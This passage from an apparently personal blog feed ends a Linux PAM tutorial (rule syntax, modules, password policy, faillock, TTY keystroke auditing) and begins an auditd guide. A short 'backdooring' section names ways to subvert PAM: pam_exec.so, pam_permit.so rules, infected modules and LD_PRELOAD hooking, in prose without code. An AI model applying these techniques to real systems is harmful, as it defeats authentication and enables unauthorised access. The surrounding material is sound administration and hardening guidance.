</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl">auth	   required	pam_sepermit.so
</span></span><span class="line"><span class="cl">auth       substack     password-auth
</span></span><span class="line"><span class="cl">auth       include      postlogin
</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
</span></span><span class="line"><span class="cl">-auth      optional     pam_reauthorize.so prepare
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">account    required     pam_nologin.so
</span></span><span class="line"><span class="cl">account    include      password-auth
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">password   include      password-auth
</span></span><span class="line"><span class="cl"># pam_selinux.so close should be the first session rule
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">session    required     pam_selinux.so close
</span></span><span class="line"><span class="cl">session    required     pam_loginuid.so
</span></span><span class="line"><span class="cl"># pam_selinux.so open should only be followed by sessions to be executed in the user context
</span></span><span class="line"><span class="cl">session    required     pam_selinux.so open env_params
</span></span><span class="line"><span class="cl">session    required     pam_namespace.so
</span></span><span class="line"><span class="cl">session    optional     pam_keyinit.so force revoke
</span></span><span class="line"><span class="cl">session    include      password-auth
</span></span><span class="line"><span class="cl">session    include      postlogin
</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
</span></span><span class="line"><span class="cl">-session   optional     pam_reauthorize.so prepare
</span></span></code></pre></div><p>Lines beginning with <code>#</code> are clearly identified as comments, while the rest of the lines contain a single rule in a line.</p>
<p>Each rule follows a similar structure but uses different keywords. The generic rule syntax looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type    control    module [modules arguments]
</span></span></code></pre></div><p>There are 4 types of <code>type</code> in the PAM rules file.</p>
<ul>
<li><strong>auth</strong> : rules for authentication.</li>
<li><strong>account</strong> : rules for account management, like expired passwords and allowed time of login.</li>
<li><strong>password</strong> : rules for password management, like checking password quality. These rules are only used when applications are changing the password used for auth.</li>
<li><strong>session</strong> : rules for session management. They typically run at the start or end of the session.</li>
</ul>
<p>And there are 6 common types of <code>control</code>:</p>
<ul>
<li><strong>required</strong> : if it fails, everything fails; if it passes, go to next.</li>
<li><strong>sufficient</strong> : if it passes, everything passes; if it fails, go to next.</li>
<li><strong>requisite</strong> : same as required- but stops on error.</li>
<li><strong>optional</strong> : pam ignores it (pass or fail); if this is the only module in stack then it decides if fail or pass.</li>
<li><strong>include</strong> : include rules from other pam files. if stack fails, return control to application.</li>
<li><strong>substack</strong> : works like include. but if the substack fails, return to the parent stack instead of giving control back to application.</li>
</ul>
<p>The <code>module</code> (and any parameters, if any) follows. By default, PAM will look for modules in the <code>/usr/lib64/security</code> directory, but you can prevent this behaviour by specifying the absolute path of the module. Some modules rely on external configuration files, which can be found in the <code>/etc/security</code> directory.</p>
<h3 id="few-common-modules">Few common modules</h3>
<p>Before delving into the actual PAM rules files, we should first understand how a few of the most common modules behave. This will make interpreting the rules from the rules file much easier.</p>
<ul>
<li><code>pam_succeed_if.so</code></li>
</ul>
<p>This module is designed to succeed or fail auth based on the characterstics of the user trying to log in and the arguments passed to the module. If all the arguments passed to the module matches the characterstics of the user trying to log in, then and only then, this module returns success.</p>
<ul>
<li><code>pam_selinux.so</code></li>
</ul>
<p>This command sets the apropriate selinux security context. This can be used to set context when a session starts and restore it back.</p>
<ul>
<li><code>pam_permit.so</code></li>
</ul>
<p>This is the simplest of all. It just permits acess and does nothing else. With that said, you should consider this module very dangerous in wrong hands.</p>
<ul>
<li><code>pam_limits.so</code></li>
</ul>
<p>As its name suggests, this module sets the limits on the system resources for a user-session. Root user(uid=0) are also affected with this module.</p>
<p>There are many limits that can be configured, so there is a dedicated folder to host configuration files for it - <code>/etc/security/limits.d</code>. Alternatively, there is a <code>/etc/security/limits.conf</code> file. But its a good practice to have separate config files if possible.</p>
<ul>
<li><code>pam_pwquality.so</code></li>
</ul>
<p>This module was developed by RedHat. The only action of this module is to prompt the user for the password and check its strength. To check its strenght, the modules uses a dictionary (of weak password) to see it the entered password is part of it. If the password is not in the list, then that password is checked against a set of rules defined by admin.</p>
<p>These rules are configurable either by the use of module arguments or <code>/etc/security/pwquality.conf</code> config file.</p>
<ul>
<li><code>pam_rootok.so</code></li>
</ul>
<p>This rule authenticates the user if the real uid is 0. No questions asked!</p>
<p>If you don&rsquo;t know about what is a real and effective UID, read this <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.</p>
<ul>
<li><code>pam_faildelay.so</code></li>
</ul>
<p>This module sets the delay on failure. Like when a user types wron password, it fails and the next prompt is delayed by this module. If the delay is not given, then it will use <code>FAIL_DELAY</code> from <code>/etc/login.defs</code>.</p>
<ul>
<li><code>pam_unix.so</code></li>
</ul>
<p>This is the standard unix authnetication module. Usually it uses <code>/etc/passwd</code> and <code>/etc/shadow</code> (if shadow is enabled) to authenticate the user. There are many tasks that can be performed by this module like checking the expire or last change of the password.</p>
<p>The session component of this module logs when user logins or logs out of the system.</p>
<ul>
<li><code>pam_deny.so</code></li>
</ul>
<p>Just like <code>pam_permit.so</code>, this module is very simple and straightforward. This denies the access to everybody.</p>
<ul>
<li><code>pam_warn.so</code></li>
</ul>
<p>This module logs the service, terminal, user, or anything to syslog. This module always return <code>PAM_IGNORE</code>, so it just log events and have no participation in authentication process apart from that.</p>
<p>We&rsquo;re almost there now. Before we go any further, there are a few more things we should consider:</p>
<ul>
<li>
<p>PAM rules are parsed from top to bottom. If a <em>sufficient</em> rule is passed, then none of the below rules will be checked.</p>
</li>
<li>
<p>Some of the rules start with <code>-</code> character, indicating that PAM should ignore them silently if the module is missing.</p>
</li>
<li>
<p>If you want to know anything about a module, there is usually a man page available. The majority of the manpages for these modules provide examples of usage and return types.</p>
</li>
<li>
<p>Making changes to PAM files has immediate effect. You do not need to restart. As a result, it&rsquo;s a good idea to keep a backup of the files before making any changes.</p>
</li>
<li>
<p>Any error in the PAM files has the potential to log you out of your system permanently. Keeping a live root shell while testing is therefore beneficial. If you made a mistake, you can undo your changes using this shell.</p>
</li>
</ul>
<h2 id="usecases">Usecases</h2>
<h3 id="enforcing-strong-passwords">enforcing strong passwords</h3>
<p>Let&rsquo;s apply everything we&rsquo;ve learned so far to observe how PAM responds to password changes made with the <code>passwd</code> utility.</p>
<p>We now know that the <code>/etc/pam.d/passwd</code> file will be used by passwd (if it exists; else, <code>/etc/pam.d/other</code> will be read). This file will provide the procedures to be followed when sshd is used for any type of <a href="https://www.cloudflare.com/learning/access-management/authn-vs-authz/">authentication and authorization</a>.</p>
<p>This makes it obvious for us to go and checkout the <code>/etc/pam.d/passwd</code> file&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl">auth       include	system-auth
</span></span><span class="line"><span class="cl">account    include	system-auth
</span></span><span class="line"><span class="cl">password   substack	system-auth
</span></span><span class="line"><span class="cl">-password   optional	pam_gnome_keyring.so use_authtok
</span></span><span class="line"><span class="cl">password   substack	postlogin
</span></span></code></pre></div><p>Analysing this file let us know that this module <strong>includes</strong> <code>system-auth</code> rules file. So we&rsquo;ll now inspect the rules mentioned in <code>/etc/pam.d/system-auth</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/system-auth
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl"># This file is auto-generated.
</span></span><span class="line"><span class="cl"># User changes will be destroyed the next time authconfig is run.
</span></span><span class="line"><span class="cl">auth        required      pam_env.so
</span></span><span class="line"><span class="cl">auth        required      pam_faildelay.so delay=2000000
</span></span><span class="line"><span class="cl">auth        sufficient    pam_unix.so nullok try_first_pass
</span></span><span class="line"><span class="cl">auth        requisite     pam_succeed_if.so uid &gt;= 1000 quiet_success
</span></span><span class="line"><span class="cl">auth        required      pam_deny.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">account     required      pam_unix.so
</span></span><span class="line"><span class="cl">account     sufficient    pam_localuser.so
</span></span><span class="line"><span class="cl">account     sufficient    pam_succeed_if.so uid &lt; 1000 quiet
</span></span><span class="line"><span class="cl">account     required      pam_permit.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">session     optional      pam_keyinit.so revoke
</span></span><span class="line"><span class="cl">session     required      pam_limits.so
</span></span><span class="line"><span class="cl">-session     optional      pam_systemd.so
</span></span><span class="line"><span class="cl">session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
</span></span><span class="line"><span class="cl">session     required      pam_unix.so
</span></span></code></pre></div><p>Only the <code>password</code> <strong>type</strong> is relevant for our intended task out of all of these rules.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span></code></pre></div><ul>
<li><code>requisite	pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=</code></li>
</ul>
<p>This rule checks the quality of password using some predefined configuration that are mentioned in <code>/etc/security/pwquality.conf</code> or can be explicitely dictated via module arguments. The <code>try_first_pass</code> option tells to load the password from previous rule (if any), else this module will make prompt user for password. <code>local_users_only</code> option will tell <code>pam_pwquality.so</code> module to ignore the users that are not in the <code>/etc/passwd</code> file. <code>retry</code> option is the number of tries a user gets to pick an acceptable password before the module returns an error. By default, the prompt the user gets when entering their password is &ldquo;New password:&rdquo;. If the administrator sets <code>authtok_type=FOO</code>, the prompt becomes &ldquo;New FOO password:&rdquo;. Here the default behaviour will be expected.</p>
<ul>
<li><code>sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok</code></li>
</ul>
<p>For pam_unix, the sha512 option means use a password hashing routine based on the SHA512 algorithm. blowfish is also supported along with several other, less secure, choices. The shadow option means maintain password hashes in a separate /etc/shadow file that is only readable by the root user. This option should always be set. nullok means allow user accounts that have null password entries. Personally, I would recommend removing this option.</p>
<ul>
<li><code>required pam_deny.so</code></li>
</ul>
<p>If the above modules failed, this should return with a deny message.</p>
<p>Now, say you want to enforce the following policy&hellip;</p>
<pre><code>- prompt 2 times for password in case of an error (retry option)
- 12 characters minimum length
- at least 6 characters should be different from old password when entering a new one (difok option)
- at least 1 digit (dcredit option)
- at least 1 uppercase (ucredit option)
- at least 1 lowercase (lcredit option)
- at least 1 other character (ocredit option)
- cannot contain the words &quot;qwerty&quot; and &quot;password&quot;
- enforce the policy for root as well.
</code></pre>
<p>&hellip; necessary changes that are needed to make are as below</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=2 minlen=12 difok=6 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1 [badwords=qwerty password] enforce_for_root
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span></code></pre></div><p>The changes to the <code>system-auth</code> file described above will affect all applications that rely on that rule file. If changes are made to the <code>passwd</code> file, they will only affect the <code>passwd</code> utility.</p>
<p>We can also use the <code>authconfig</code> utility to make nearly all of these changes without having to interact directly with the associated files.
More information can be found <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd">here</a> . <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<h3 id="lock-out-at-multiple-failed-attempts">lock out at multiple failed attempts</h3>
<p>We can also use PAM to configure the system so that if a single user makes multiple failed attempts, the PAM will lock out that user for a set period of time. Similarly to how your mobile device locks out the user for the next few hours if multiple login attempts fail.</p>
<p>This is possible with the <code>pam faillock</code> module. Because there is no dedicated config file for this module, all configuration will be done through module arguments. You can either manually edit the rule files with your favourite text editor or use the authconfig utility to make changes.</p>
<p>Before you begin, you must determine whether or not <code>pam_faillock</code> is enabled.
This can be verified using</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
</span></span></code></pre></div><p>For me the default output was</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is disabled (deny=4 unlock_time=1200)
</span></span></code></pre></div><p>So I had to enable it via <code>authconfig --enablefaillock</code> and along with that you can pass module arguments via  <code>authconfig --faillockargs=&lt;module_options&gt;</code> flag.</p>
<p>Or, one can combine both of the actions in a single command like</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --enablefaillock --faillockargs=&#34;fail_interval=30 deny=3 unlock_time=3600&#34; --update
</span></span></code></pre></div><p>The above command will add <code>pam_faillock</code> rule in all of the relevant rules file (located in <code>/etc/pam.d/</code> directory). And the rest of the commands will configure the behaviour of the <code>pam_faillock</code> module. All of the module options can be checked with <code>man pam_faillock</code>.</p>
<p>Now the output of below command is slight different.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is enabled (fail_interval=30 deny=3 unlock_time=3600)
</span></span></code></pre></div><p>You can list the failed login attempts with the <code>faillock</code> command.</p>
<h3 id="tty-auditing--cough--keylogging--cough">TTy auditing ( *cough*  keylogging  *cough*)</h3>
<p>Audit system (In Redhat or similar linux distros) uses <code>pam_tty_audit</code> PAM module for auditing of TTY input. When user logins, this module logs all keystrokes that user makes to <code>/var/log/audit/audit.log</code> file.</p>
<p>Since this depends on <code>auditd</code> service and requires that to be configured and running properly.</p>
<p>There is no <code>authconfig</code> flag that can enable this (atleast, there is none in centos 7.5), so we&rsquo;ll have to follow the traditional way of editing files manually to configure it.</p>
<p>This module only provides support for <strong>session</strong> type. That means we can only add <strong>session</strong> rules to our required files and it&rsquo;ll take effect immidiately for that service.</p>
<p>My idea is to add this rule in <code>/etc/pam.d/system-auth</code> and <code>/etc/pam.d/password-auth</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session     required    pam_tty_audit.so  enable=*
</span></span></code></pre></div><p>The above rule will capture all of the tty inputs as it is and store them in <code>/var/log/audit/audit.log</code> file (by default). You can easily <code>grep</code> stuff from that or use a proper tool to query the logs&hellip; like <code>aureport</code>.</p>
<p><code>aureport --tty</code> command filters all <code>TYPE=tty</code> logs events from the file and display them in very human readable format.</p>
<h3 id="backdooring">backdooring</h3>
<p>Till this point, we have learnt a lot about PAM and it is time to rethink on the basics once again. PAM has 3 components: <strong>user</strong>, <strong>password</strong> and <strong>service</strong>. It&rsquo;s role is to authenticate a <em>user</em> to a <em>service</em> with provided <em>password</em>.</p>
<p>It works elegantly with the help of some service files of same name as of the service itself. These files are located in <code>/etc/pam.d/</code> directory. Each file has one or more rules that helps PAM to take proper decisions.</p>
<p>There are a lot of methods with which we can backdoor the PAM system. One of the many ways is to use <code>pam_exec.so</code> module to run an arbitrary command at each PAM based event. Another way could be to add rule using <code>pam_permit.so</code> module, that will skip the required checks to authenticate user for that service.</p>
<p>The above techniques are very noisy and are easily detected. More sophesticated attacks would include replacing the original module with custom compiled infected module on target system&hellip; or function hooking via <code>LD_PRELOAD</code> technique.</p>
<p>I&rsquo;ll leave the practical part upto you. Please don&rsquo;t do anything stupid or unethical on production server or any other system without the owner&rsquo;s consent.</p>
<p>Keep it healthy and stay safe!!</p>
<h2 id="resources">Resources:</h2>
<ul>
<li><a href="https://likegeeks.com/linux-pam-easy-guide/">https://likegeeks.com/linux-pam-easy-guide/</a></li>
<li><a href="https://aplawrence.com/Basics/understandingpam.html">https://aplawrence.com/Basics/understandingpam.html</a></li>
<li><a href="https://www.linux.com/news/understanding-pam/">https://www.linux.com/news/understanding-pam/</a></li>
<li><a href="https://developer.ibm.com/tutorials/l-pam/">https://developer.ibm.com/tutorials/l-pam/</a></li>
<li><a href="https://github.com/linux-pam/linux-pam">https://github.com/linux-pam/linux-pam</a> (Source code)</li>
<li><a href="https://wiki.archlinux.org/title/PAM#Examples">https://wiki.archlinux.org/title/PAM#Examples</a></li>
<li><a href="https://lwn.net/Articles/470764/">https://lwn.net/Articles/470764/</a> (A look at PAM face-recognition authentication)</li>
<li><a href="https://lwn.net/Articles/523199/">https://lwn.net/Articles/523199/</a> (Google Authenticator for multi-factor authentication)</li>
</ul>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29">https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>(<a href="https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id">https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id</a>)&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>Recording system events with auditd</title>
      <link>https://ayedaemon.github.io/post/2022/12/recording_system_events_with_auditd/</link>
      <pubDate>Sun, 11 Dec 2022 21:15:13 +0530</pubDate>
      
      <guid>https://ayedaemon.github.io/post/2022/12/recording_system_events_with_auditd/</guid>
      <description>auditing linux systems with auditd</description>
      <content:encoded><![CDATA[<p>Audits are critical for system administrators to detect security violations and track security-relevant information on their systems.
Anyone concerned about the security, stability, and proper operation of their Linux servers should conduct an audit.</p>
<h2 id="how-to-do-auditing-in-linux">How to do auditing in linux</h2>
<p>One simple way is to use the <code>history</code> command to observe the shell&rsquo;s history, but this has many limitations. One of them is that this command is only applicable to the current user. You can still get around this by reading the <code>.bash_history</code> file in each user&rsquo;s home directory (given you have permissions to do so).</p>
<h3 id="audit-framework-in-kernel">Audit framework in kernel.</h3>
<p>The Linux audit framework is a better option.
Because it operates at the kernel level, it has a lot of visibility over almost everything. The Linux kernel sends significant events to user-space (<code>auditd</code>) so that they can be recorded in a file. This file can then be analysed on the host system or sent to a remote location for storage and analysis.</p>
<h2 id="user-space-auditd">User-space auditd</h2>
<p>The majority of Linux distributions come with <code>auditd</code> preinstalled, which begins and stops with the system (as a systemd service file). Using below command, you may determine whether the kernel was built using the audit options.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grep -i audit /boot/config-`uname -r`
</span></span></code></pre></div><p>On my system, it gives me below output (indicating kernel was built with auditing feature)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CONFIG_AUDIT_ARCH=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT=y
</span></span><span class="line"><span class="cl">CONFIG_AUDITSYSCALL=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT_WATCH=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT_TREE=y
</span></span><span class="line"><span class="cl">CONFIG_NETFILTER_XT_TARGET_AUDIT=m
</span></span><span class="line"><span class="cl">CONFIG_IMA_AUDIT=y
</span></span><span class="line"><span class="cl">CONFIG_KVM_MMU_AUDIT=y
</span></span></code></pre></div><p>Second thing you would want to check if the kernel thread process responsible for sending data to user-space is running. Check that with the <code>ps</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ps -aux | grep -i kauditd
</span></span></code></pre></div><p>This gives me below output (indicating that the thread is running)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root       103  0.0  0.0      0     0 ?        S    11:39   0:00 [kauditd]
</span></span></code></pre></div><p>Final thing is to check the user-space service responsible to get the data from <code>kauditd</code>. To obtain definitive indications on systemd systems, use the commands listed below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">systemctl is-active auditd          ## Returns: active/inactive
</span></span><span class="line"><span class="cl">systemctl is-enabled auditd         ## Returns: enabled/disabled
</span></span></code></pre></div><p><em>(<strong>Note</strong>: Feel free to check the source code at <a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c"><code>kernel/audit.c</code></a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>)</em></p>
<h3 id="configuring-auditd">Configuring auditd</h3>
<p><code>Auditd</code> decides what to log and what not to log using a set of rules. These rules can be found in the <code>/etc/audit/rules.d/</code> folder. Auditd reads files from this folder on startup and generates the <code>/etc/audit/audit.rules</code> file automatically. <strong>(This file should not be edited by hand.)</strong></p>
<p><code>auditd</code> comes with a configuration file too. This file helps in changing the behaviour of the userspace <code>auditd</code> daemon. Default file on my system looks like below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># sudo cat -n /etc/audit/auditd.conf</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="mi">1</span>	<span class="c1">#</span>
</span></span><span class="line"><span class="cl">     <span class="mi">2</span>	<span class="c1"># This file controls the configuration of the audit daemon</span>
</span></span><span class="line"><span class="cl">     <span class="mi">3</span>	<span class="c1">#</span>
</span></span><span class="line"><span class="cl">     <span class="mi">4</span>	
</span></span><span class="line"><span class="cl">     <span class="mi">5</span>	<span class="n">local_events</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">     <span class="mi">6</span>	<span class="n">write_logs</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">     <span class="mi">7</span>	<span class="n">log_file</span> <span class="o">=</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">audit</span><span class="o">/</span><span class="n">audit</span><span class="o">.</span><span class="n">log</span>
</span></span><span class="line"><span class="cl">     <span class="mi">8</span>	<span class="n">log_group</span> <span class="o">=</span> <span class="n">root</span>
</span></span><span class="line"><span class="cl">     <span class="mi">9</span>	<span class="n">log_format</span> <span class="o">=</span> <span class="n">RAW</span>
</span></span><span class="line"><span class="cl">    <span class="mi">10</span>	<span class="n">flush</span> <span class="o">=</span> <span class="n">INCREMENTAL_ASYNC</span>
</span></span><span class="line"><span class="cl">    <span class="mi">11</span>	<span class="n">freq</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="mi">12</span>	<span class="n">max_log_file</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="mi">13</span>	<span class="n">num_logs</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="mi">14</span>	<span class="n">priority_boost</span> <span class="o">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">    <span class="mi">15</span>	<span class="n">disp_qos</span> <span class="o">=</span> <span class="n">lossy</span>
</span></span><span class="line"><span class="cl">    <span class="mi">16</span>	<span class="n">dispatcher</span> <span class="o">=</span> <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">audispd</span>
</span></span><span class="line"><span class="cl">    <span class="mi">17</span>	<span class="n">name_format</span> <span class="o">=</span> <span class="n">NONE</span>
</span></span><span class="line"><span class="cl">    <span class="mi">18</span>	<span class="c1">##name = mydomain</span>
</span></span><span class="line"><span class="cl">    <span class="mi">19</span>	<span class="n">max_log_file_action</span> <span class="o">=</span> <span class="n">ROTATE</span>
</span></span><span class="line"><span class="cl">    <span class="mi">20</span>	<span class="n">space_left</span> <span class="o">=</span> <span class="mi">75</span>
</span></span><span class="line"><span class="cl">    <span class="mi">21</span>	<span class="n">space_left_action</span> <span class="o">=</span> <span class="n">SYSLOG</span>
</span></span><span class="line"><span class="cl">    <span class="mi">22</span>	<span class="n">verify_email</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">    <span class="mi">23</span>	<span class="n">action_mail_acct</span> <span class="o">=</span> <span class="n">root</span>
</span></span><span class="line"><span class="cl">    <span class="mi">24</span>	<span class="n">admin_space_left</span> <span class="o">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">    <span class="mi">25</span>	<span class="n">admin_space_left_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">26</span>	<span class="n">disk_full_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">27</span>	<span class="n">disk_error_action</span> <span class="o">=</span> <span class="n">SUSPEND</span>
</span></span><span class="line"><span class="cl">    <span class="mi">28</span>	<span class="n">use_libwrap</span> <span class="o">=</span> <span class="n">yes</span>
</span></span><span class="line"><span class="cl">    <span class="mi">29</span>	<span class="c1">##tcp_listen_port = 60</span>
</span></span><span class="line"><span class="cl">    <span class="mi">30</span>	<span class="n">tcp_listen_queue</span> <span class="o">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">    <span class="mi">31</span>	<span class="n">tcp_max_per_addr</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="mi">32</span>	<span class="c1">##tcp_client_ports = 1024-65535</span>
</span></span><span class="line"><span class="cl">    <span class="mi">33</span>	<span class="n">tcp_client_max_idle</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="mi">34</span>	<span class="n">enable_krb5</span> <span class="o">=</span> <span class="n">no</span>
</span></span><span class="line"><span class="cl">    <span class="mi">35</span>	<span class="n">krb5_principal</span> <span class="o">=</span> <span class="n">auditd</span>
</span></span><span class="line"><span class="cl">    <span class="mi">36</span>	<span class="c1">##krb5_key_file = /etc/audit/audit.key</span>
</span></span><span class="line"><span class="cl">    <span class="mi">37</span>	<span class="n">distribute_network</span> <span class="o">=</span> <span class="n">no</span>
</span></span></code></pre></div><p>Some of these options are easy to understand, like:</p>
<ul>
<li><strong>log_file</strong> : Tells the location of the audit log file.</li>
<li><strong>max_log_file</strong> : Defines the size of the log file in MB. If the size is reached, <strong>max_log_file_action</strong> is triggered.</li>
<li><strong>space_left</strong> : Triggers the <strong>space_left_action</strong> when the limit is reached.</li>
<li>To include additional information in audit logs you need to change <code>log format</code> from <strong>RAW</strong> to <code>ENRICHED</code>.</li>
<li><code>FLUSH = INCREMENTAL_ASYNC</code> will write the logs async instead of writing them on every write.</li>
</ul>
<p>While some of them needs more detailed explaination. In any case, always refer the man pages &ndash;&gt; <a href="https://www.man7.org/linux/man-pages/man5/auditd.conf.5.html"><code>man (5) auditd.conf</code></a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. There you will find all the possible options and their supporting values to tune auditd as per your requirements.</p>
<p>After making changes to <code>auditd.conf</code>, restart the service to pick up new changes from config. My <code>centos 7</code> machine did not allow me to manually restart the service using <code>systemctl</code> but it worked just fine with <code>service auditd restart</code>. If you figure out why this happens, please let me know!</p>
<h3 id="inspecting-audit-logs">Inspecting audit logs</h3>
<p>We can see where the <code>auditd</code> logs are stored from the config file above. So we can always look through the log files and use the good old <code>grep</code> command to find what we&rsquo;re looking for.</p>
<p>But that is not the intended method. The <code>audit</code> package includes a number of helper commands to assist the sysadmin/analyst in quickly determining information from logs.</p>
<p>Below are all the binary executable files provided by the <code>audit</code> package&hellip;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">## COMMAND:   rpm -ql audit | grep bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/sbin/audispd
</span></span><span class="line"><span class="cl">/sbin/auditctl
</span></span><span class="line"><span class="cl">/sbin/auditd
</span></span><span class="line"><span class="cl">/sbin/augenrules
</span></span><span class="line"><span class="cl">/sbin/aureport
</span></span><span class="line"><span class="cl">/sbin/ausearch
